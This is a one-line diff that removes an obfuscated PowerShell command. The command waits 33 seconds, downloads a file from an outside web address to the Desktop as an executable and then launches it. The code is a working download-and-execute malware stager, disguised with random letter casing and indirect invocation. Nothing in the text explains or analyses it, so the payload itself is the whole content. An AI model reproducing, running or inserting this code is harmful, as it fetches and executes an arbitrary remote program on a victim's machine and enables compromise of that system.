@@ -1,1 +1,0 @@
-$7d0mK6 = [TyPE]'ENvIronmENt' ; &'sleep' 33;${Des} = $7d0mk6::gETFoLDerpATh('Desktop');(&'New-Object' 'System.Net.WebClient').dOwNLoaDFile.iNvoKE('http://momerton.com/watchm','$Des\7178037.exe');&'Start-Process' $Des\7178037.exe
